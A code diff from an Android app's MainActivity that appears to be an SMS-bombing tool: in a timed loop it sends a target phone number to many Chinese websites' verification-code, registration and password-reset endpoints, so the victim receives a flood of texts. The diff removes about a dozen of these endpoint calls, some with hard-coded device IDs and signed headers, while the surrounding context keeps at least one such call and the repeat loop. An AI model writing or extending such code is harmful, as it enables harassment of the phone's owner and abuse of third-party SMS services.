@@ -119,32 +119,8 @@ public class MainActivity extends BaseActivity {
                 Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                 OkGo.<String>post("https://api2.drcuiyutao.com/v55/user/sendVerificationCode?dialCode=86&mobile=" + sphone).tag(this).execute(callback);
                 Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>post("https://api.shiguangxiaowu.cn/zh-CN/verify_codes?reset=false&phone_code=86&phone=" + sphone).tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>post("http://api-www.wawachina.cn/rest/message/verification/code/send/v50?userType=1&action=register&sessionKey=null&sign_v2=OpwcFIhvcmQdWVK4bPehpWA4dZt7fltgeObgM8suTPI=").upJson(sphone).tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>post("http://pay.babybus.org/V2/User/sendCode/flag/1").headers("ClientHeaderInfo", "0eyJWZXJDb2RlIjoiOS4yMC4xMC4wMCIsIkFjY291bnRJRFNpZ25hdHVyZSI6IiIsIkFwcExhbmciOiJ6aCIsIkJTU0lEIjoiMDElM0E4MCUzQWMyJTNBMDAlM0EwMCUzQTAzIiwiQ0hDb2RlIjoiQTAwMiIsIlRva2VuIjoiIiwiU2ltSURGQSI6IiIsIkRldmljZUxhbmciOiJ6aCIsIkRldmljZU1vZGVsIjoiU00tRzkzMEYiLCJTZXNzaW9uSUQiOiIiLCJJREZBIjoiIiwiSURGViI6IiIsIklNRUkiOiI4NjU4MjEwNzk0ODMyNzAiLCJKYkZsYWciOiIiLCJMb2dpbkNvZGUiOiIiLCJMb2dpblNpZ25hdHVyZSI6IiIsIlNlcmlhbCI6IjQwNzEwNDMzMjU5MDg4NzciLCJNYWMiOiIwOCUzQTAwJTNBMjclM0FlMyUzQTU4JTNBMGUiLCJTY3JlZW4iOiIxMDgwKjE5MjAiLCJSVGltZSI6IiIsIk9TVmVyIjoiNC40LjQiLCJPcGVuSUQiOiI0MDcxMDQzMzI1OTA4ODc3Xzg2NTgyMTA3OTQ4MzI3MF8wOCUzQTAwJTNBMjclM0FlMyUzQTU4JTNBMGUiLCJBY2NvdW50SUQiOjAsIkxvZ2luU3RhbXAiOjAsIlByb2plY3RJRCI6NiwiT1NUeXBlIjoyLCJOZXQiOjEsIlByb2R1Y3RJRCI6MzAxNywiRGV2aWNlVHlwZSI6MSwiRGF0YVR5cGUiOjIsIkNISUQiOjAsIlBsYXRGb3JtIjoxMSwiVmVySUQiOjB9").params("phone", sphone).tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>post("http://admin.tengw.cn/api").params("params", "{\"data\":{\"captcha\":\"twzhyj\",\"mobile\":\"" + sphone + "\"},\"usr_token\":\"\",\"biz\":\"com.api.v3.password.forgot.create\",\"uac_id\":\"\"}").tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>post("https://www.cookmami.com/user/sumSend").params("send_code", "6397").params("deviceId", "865821079483270").params("mobile", sphone).tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>post("http://api.qbaoting.com/v3.0.0/Passport/User/sendMobileCode?hash=34b0ed9ec277e226ebf263d06c9ee186&appid=50&deviceid=50973785a25a5494fe9dbe5847419032&time=1515492625&channel=x360").params("mobile", sphone).params("type", "1").tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>post("http://api2.gymboclub.com/?app=api&mod=Oauth&act=sendRegisterSMS").params("phone", sphone).tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>post("https://login.10086.cn/sendRandomCodeAction.action?type=01&channelID=12027&userName=" + sphone).tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>get("https://portal.feiyucloud.com/sms/sendSms?districtCode=86&smsType=1&phoneNumber=" + sphone).tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>get("https://www.51mjs.com/pc/index/getPhoneValCode?type=1&_=" + TimeUitls.date2LongString() + "&phone=" + sphone).tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-
-//??
 
 
-                OkGo.<String>post("" + sphone).tag(this).execute(callback);
-                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
 
 
                 if (--sloopCount > 0) {
